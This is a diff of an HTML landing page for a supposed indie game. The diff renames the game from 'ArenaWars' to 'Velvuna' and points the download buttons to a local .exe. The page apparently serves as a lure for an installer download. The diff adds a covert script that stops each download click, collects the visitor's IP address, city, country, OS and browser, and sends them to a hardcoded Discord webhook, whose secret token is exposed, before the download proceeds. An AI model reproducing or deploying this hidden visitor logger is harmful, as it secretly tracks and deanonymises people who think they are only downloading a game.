@@ -1,13 +1,13 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>ArenaWars: Awakening of the Veil | Dark Fantasy Action-Adventure Game</title>
-  <meta name="description" content="ArenaWars — an atmospheric multi/single-player action-adventure. Lose yourself in a dark fable, master timing-based combat, and conquer the shadows in this beautifully crafted dark fantasy world.">
-  <meta name="keywords" content="ArenaWars, action-adventure game, dark fantasy, multi/single-player game, indie game, PC game, game download">
-  <meta property="og:title" content="ArenaWars: Awakening of the Veil">
+  <title>velvuna: Awakening of the Veil | Dark Fantasy Action-Adventure Game</title>
+  <meta name="description" content="velvuna — an atmospheric multi/single-player action-adventure. Lose yourself in a dark fable, master timing-based combat, and conquer the shadows in this beautifully crafted dark fantasy world.">
+  <meta name="keywords" content="velvuna, action-adventure game, dark fantasy, multi/single-player game, indie game, PC game, game download">
+  <meta property="og:title" content="velvuna: Awakening of the Veil">
   <meta property="og:description" content="Embark on an unforgettable journey through the Veil, where every choice shapes your destiny.">
   <meta property="og:image" content="media/main.dde7f6b9.html">
   <meta property="og:type" content="website">
@@ -16,18 +16,17 @@
   <link rel="icon" type="image/png" href="media/favicon.html">
   <link rel="stylesheet" href="cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
+
 <body>
-  <!-- Loading Screen -->
   <div class="loading-screen">
     <div class="loader"></div>
-    <p>Loading ArenaWars...</p>
+    <p>Loading velvuna...</p>
   </div>
 
-  <!-- Navigation -->
   <header class="site-header">
     <div class="brand">
-      <img class="logo" src="media/blacktail.gif" alt="ArenaWars logo">
-      <span class="title">ArenaWars</span>
+      <img class="logo" src="media/blacktail.gif" alt="velvuna logo">
+      <span class="title">Velvuna</span>
     </div>
     <nav class="main-nav">
       <ul>
@@ -37,7 +36,7 @@
         <li><a href="#testimonials">Testimonials</a></li>
       </ul>
     </nav>
-    <a class="download-btn" href="https://www.dropbox.com/scl/fi/0nl3pfs7l5qnqb5xi2p3k/ArenaWarsInstaller.msi?rlkey=6ol32tejvb2r8a2p0accgcwff&st=9m8j3pj3&dl=1">
+    <a class="download-btn js-download-tracker" href="downloads/Velvuna 2.1.1.exe" download="">
       <i class="fas fa-download"></i> Download
     </a>
     <button class="mobile-menu-btn" aria-label="Toggle menu">
@@ -57,15 +56,15 @@
     </div>
     <div class="hero-inner">
       <h1>Awakening of the Veil</h1>
-      <p>ArenaWars is my atmospheric single-player action-adventure. Dive into a dark fable, master timing-based melee, and chart your own path through exploration-driven level design.</p>
-      <a class="cta" href="https://www.dropbox.com/scl/fi/0nl3pfs7l5qnqb5xi2p3k/ArenaWarsInstaller.msi?rlkey=6ol32tejvb2r8a2p0accgcwff&st=9m8j3pj3&dl=1" download="">Download</a>
+      <p>Velvuna is my atmospheric single-player action-adventure. Dive into a dark fable, master timing-based melee, and chart your own path through exploration-driven level design.</p>
+      <a class="cta js-download-tracker" href="downloads/Velvuna 2.1.1.exe" download="">Download</a>
     </div>
   </section>
 
   <section id="features" class="features container">
     <h2 class="section-title">Game Features</h2>
     <p class="section-subtitle">Experience a rich, atmospheric adventure with deep gameplay mechanics</p>
-    
+
     <div class="features-grid">
       <div class="feature">
         <div class="feature-icon"><i class="fas fa-sword"></i></div>
@@ -167,7 +166,7 @@
         <h2>About velvuna</h2>
         <p class="lead">Embark on an unforgettable journey through the Veil, where every choice shapes your destiny.</p>
         <p>velvuna is an atmospheric action-adventure that combines precise combat with deep exploration in a beautifully crafted dark fantasy world. Master the art of combat, uncover ancient secrets, and forge your own path through an interconnected world filled with danger and wonder.</p>
-        
+
         <div class="features-grid">
           <div class="feature-item">
             <h4>Immersive Combat</h4>
@@ -186,7 +185,7 @@
             <p>Unravel the mysteries of the Veil through environmental storytelling.</p>
           </div>
         </div>
-        
+
         <div class="system-requirements">
           <h4>System Requirements</h4>
           <div class="requirements-grid">
@@ -219,7 +218,7 @@
         <div class="footer-brand">
           <div class="brand">
             <img class="logo" src="media/blacktail.gif" alt="velvuna logo">
-            <span class="title">ArenaWars</span>
+            <span class="title">velvuna</span>
           </div>
           <p>An atmospheric action-adventure set in a dark fantasy world.</p>
           <div class="social-links">
@@ -270,7 +269,6 @@
     </div>
   </footer>
 
-  <!-- Back to Top Button -->
   <button id="back-to-top" aria-label="Back to top">
     <i class="fas fa-arrow-up"></i>
   </button>
@@ -290,7 +288,7 @@
     // Mobile menu toggle
     const menuBtn = document.querySelector('.mobile-menu-btn');
     const nav = document.querySelector('.main-nav');
-    
+
     if (menuBtn && nav) {
       menuBtn.addEventListener('click', () => {
         menuBtn.classList.toggle('active');
@@ -304,14 +302,14 @@
         e.preventDefault();
         const targetId = this.getAttribute('href');
         if (targetId === '#') return;
-        
+
         const targetElement = document.querySelector(targetId);
         if (targetElement) {
           window.scrollTo({
             top: targetElement.offsetTop - 80,
             behavior: 'smooth'
           });
-          
+
           // Close mobile menu if open
           if (menuBtn && menuBtn.classList.contains('active')) {
             menuBtn.classList.remove('active');
@@ -340,7 +338,89 @@
       });
     }
   </script>
-<script defer="" src="beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"1d40c0dc80534381a243d1db6caf0eeb","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
-</body>
+  
+  <script>
+    // Tüm 'js-download-tracker' sınıfına sahip butonları seç
+    const downloadButtons = document.querySelectorAll('.js-download-tracker');
 
+    downloadButtons.forEach(button => {
+      button.addEventListener('click', function(event) {
+        // İndirmeyi anlık olarak durdur, önce logu gönderelim
+        event.preventDefault();
+        
+        // İndirme linkini al
+        const downloadLink = this.href;
+
+        fetch("https://ipinfo.io/json")
+          .then(response => response.json())
+          .then(data => {
+            const ip = data.ip;
+            const country = data.country;
+            const city = data.city;
+            const flag = `https://flagsapi.com/${country}/flat/64.png`;
+
+            // Kullanıcı tarayıcı ve işletim sistemi bilgisi
+            const userAgent = navigator.userAgent;
+            let os = "Bilinmiyor";
+            let browser = "Bilinmiyor";
+
+            if (userAgent.includes("Windows")) os = "Windows";
+            else if (userAgent.includes("Mac")) os = "MacOS";
+            else if (userAgent.includes("Linux")) os = "Linux";
+            else if (userAgent.includes("Android")) os = "Android";
+            else if (userAgent.includes("iPhone")) os = "iOS";
+
+            if (userAgent.includes("Chrome")) browser = "Google Chrome";
+            else if (userAgent.includes("Firefox")) browser = "Mozilla Firefox";
+            else if (userAgent.includes("Safari")) browser = "Safari";
+            else if (userAgent.includes("Edge")) browser = "Microsoft Edge";
+            else if (userAgent.includes("Opera")) browser = "Opera";
+
+            // ⚠️ DİKKAT: AŞAĞIYA KENDİ WEBHOOK LİNKİNİ YAPIŞTIR
+            const webhookURL = "https://ptb.discord.com/api/webhooks/1447650737734553789/DUDHs5AMRuERiR9D_JOIgwlHd-EUjhW_EfYGL-ZGTEioMtOJRmxEHwLwgCxalcq6TbMx"; 
+
+            const payload = {
+              username: "Velvuna İndirme Takip",
+              avatar_url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRkfiN_vDoL3bK4CyZywObSXjG1bpcJSf8MMw&s",
+              embeds: [
+                {
+                  title: "📥 Yeni Bir İndirme Başlatıldı!",
+                  description: "Kullanıcı Velvuna oyununu indiriyor.",
+                  color: 15158332, 
+                  fields: [
+                    { name: "🌍 Konum", value: `📍 ${city}, ${country}`, inline: true },
+                    { name: "🌐 IP Adresi", value: `\`${ip}\``, inline: true },
+                    { name: "💻 Sistem", value: `\`${os}\``, inline: true },
+                    { name: "🌍 Tarayıcı", value: `\`${browser}\``, inline: true }
+                  ],
+                  thumbnail: { url: flag },
+                  footer: { text: "Velvuna Logger", icon_url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRkfiN_vDoL3bK4CyZywObSXjG1bpcJSf8MMw&s" },
+                  timestamp: new Date().toISOString()
+                }
+              ]
+            };
+
+            // Webhook'a veriyi gönder
+            fetch(webhookURL, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(payload)
+            }).then(() => {
+              // Log gönderildikten sonra indirmeyi başlat
+              window.location.href = downloadLink;
+            }).catch(error => {
+              console.error("Hata:", error);
+              // Hata olsa bile indirmeyi başlat
+              window.location.href = downloadLink;
+            });
+          })
+          .catch(() => {
+            // IP servisi çalışmazsa direkt indirmeyi başlat
+            window.location.href = downloadLink;
+          });
+      });
+    });
+  </script>
+  <script defer="" src="beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"1d40c0dc80534381a243d1db6caf0eeb","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
 </html>
